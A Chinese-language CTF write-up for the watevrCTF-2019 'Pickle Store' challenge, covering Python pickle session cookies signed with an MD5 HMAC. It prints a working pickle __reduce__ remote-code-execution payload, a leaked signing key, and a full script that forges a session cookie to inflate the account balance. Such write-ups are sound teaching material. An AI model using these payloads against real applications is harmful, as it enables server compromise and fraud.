---
date: 2026-11-17 17:00:00
slug: watevrctf2019-pickle-store
categories:
  - Python
  - 反序列化
  - 代码审计
---

# [watevrCTF-2019] Pickle Store — 改完钱还得把签名一起算对

> **题目类型**：Python 反序列化 — pickle session + HMAC 签名伪造
>
> **Flag**：`CTF2{eea2f800-cc38-47ee-bc10-05205f709eb8}`

---

## 题目概述

一个卖腌黄瓜的商店。**目标很明确：买下那个 $1000 的 Flag Pickle。**

**但初始资金不够。**页面顶上显示 `Your funds: $998999`（这是改成功之后的样子，初始只有 500）。

于是问题变成：**怎么让服务器相信我有钱。**

---

## 解题过程

### Step 1：先随便买几个，看看有没有别的反馈

**点了标准腌黄瓜（$10）和 Smörgåsgurka（$100），除了 history 里多两条记录，没有别的反应。**

**真正的东西在 cookie 里。**

### Step 2：session cookie 是 base64 过的 pickle

**抓包看到一个 `session` cookie，长得像 base64：**

```text
gAN9cQAoWAAAA...（很长）
```

**base64 解一次，得到的是二进制——而且开头是 `\x80\x04\x95`，这是 **pickle 的协议头**。**

**Python 的 session 直接把字典 pickle 完再 base64 塞进 cookie，等于把内部对象结构交给客户端保存。**

### Step 3：解开看结构

```python
import pickle, base64

data = pickle.loads(base64.b64decode(session_cookie))
print(data)
```

**得到一个字典：**

```python
{
  'money': 500,
  'history': ['Yummy smörgåsgurka', 'Yummy standard pickle'],
  'anti_tamper_hmac': '29ea7e88282f92f4ffc2976f14905697'
}
```

**三个键：钱、购买记录、还有一个防篡改的 HMAC。**

### Step 4：直接改 money —— 失败

**第一反应是 `data['money'] = 1000000`，重新 pickle + base64，替换 cookie。**

**结果页面上钱还是 500。**

**原因就是第三个键：`anti_tamper_hmac`。**

**服务端每次收到请求都会**重新算一遍 HMAC**，和你 cookie 里带来的那个比。对不上，就用默认的 `money=500` 重建 session。**

**所以光改值不行，**签名也得跟着对**。**

### Step 5：顺手试一下 pickle 本身能不能执行代码

**pickle 反序列化的经典利用是 `__reduce__`：**

```python
class evil:
    def __reduce__(self):
        import os
        return (eval, ("__import__('os').system('sleep 5') or 0",))

payload = base64.b64encode(pickle.dumps(evil(), protocol=4)).decode()
```

**把 session 换成这个 payload，页面**确实延迟了 5 秒**——说明服务器在反序列化的那一刻就执行了我们的代码。**

**接着试了把 `ls` 的结果写到 `static/` 目录下，再从浏览器去访问，打不开。**这条路放弃。

### Step 6：去 GitHub 找源码

**作者把源码开源在 GitHub 上。翻到处理 session 的那段：**

```python
h = hmac.new(key)
h.update(str(cookies).encode())
cookies["anti_tamper_hmac"] = h.digest().hex()
resp.set_cookie("session", base64.b64encode(pickle.dumps(cookies)))
return resp
```

**然后把 key 也找到了：**

```python
key = b"58c93becce9a13c96778ded0edd8096d"
```

**这里要注意两个细节：**

```
① HMAC 用的是 md5（源码里 hmac.new(key, digestmod=hashlib.md5)）
② 参与计算的是 str(cookies)，而且是在**加入 anti_tamper_hmac 之前**的字典
```

**也就是说：服务端把你 cookie 里的 `money` 和 `history` 拼成 Python 字典的字符串形式，再算 HMAC。**

**知道 key，我们就能自己算出一个合法的签名。**

### Step 7：本地构造 + 签名 + 替换

```python
import base64
import pickle
import hmac
import hashlib

key = b"58c93becce9a13c96778ded0edd8096d"

h = hmac.new(key, digestmod=hashlib.md5)

# 注意顺序：和服务器保持一致，先 money 再 history
cookies = {"money": 999999, "history": []}
h.update(str(cookies).encode())

# 算完再把签名塞进去
cookies["anti_tamper_hmac"] = h.digest().hex()

print(base64.b64encode(pickle.dumps(cookies, protocol=4)).decode())
```

**把这个输出替换掉浏览器的 `session` cookie，刷新——钱变成了 $998999。**

**然后点 Flag Pickle 的 Buy。**

**拿到：**

```text
CTF2{eea2f800-cc38-47ee-bc10-05205f709eb8}
```

---

| 关键点 | 说明 |
| --- | --- |
| session 格式 | `base64(pickle.dumps(dict))`，客户端持有完整对象 |
| 防篡改 | `anti_tamper_hmac`，服务端每次重算并比对 |
| 参与签名的内容 | `str(cookies)`，且**不包含** `anti_tamper_hmac` 自身 |
| 字典顺序 | Python 3.7+ 保持插入顺序，`str(dict)` 的结果依赖它，**必须和服务器一致** |
| pickle 可执行 | `__reduce__` 能在反序列化时执行任意代码（sleep 5 验证过） |
| 最终解法 | 源码泄露 key → 自己算 HMAC → 改钱不触发重置 |

---

??? note "完整脚本"

    ```python
    import base64
    import pickle
    import hmac
    import hashlib

    key = b"58c93becce9a13c96778ded0edd8096d"

    h = hmac.new(key, digestmod=hashlib.md5)
    cookies = {"money": 999999, "history": []}
    h.update(str(cookies).encode())
    cookies["anti_tamper_hmac"] = h.digest().hex()

    print(base64.b64encode(pickle.dumps(cookies, protocol=4)).decode())
    ```

??? note "这题踩的坑"

    **① 只改 money 不改签名**

    服务端会重算 HMAC，对不上就丢弃整个 session，用默认值（money=500）重建。**表现出来就是“我的修改没生效”。**

    **② 把 `anti_tamper_hmac` 一起算进签名**

    源码里是**先算 HMAC、后插入这个键**。你把带签名的字典再算一遍，结果一定对不上。

    **③ 字典顺序变了**

    `str({'history': [], 'money': 999999})` 和 `str({'money': 999999, 'history': []})` 是两个不同的字符串。**键的插入顺序必须和服务器一致。**

    **④ 以为 pickle RCE 这条路能直接拿 flag**

    代码执行确实成立（sleep 5 有效），但 flag 不在磁盘上随便一个位置——它要靠“买”这个业务动作才会显示。**所以还是得回到签名伪造。**
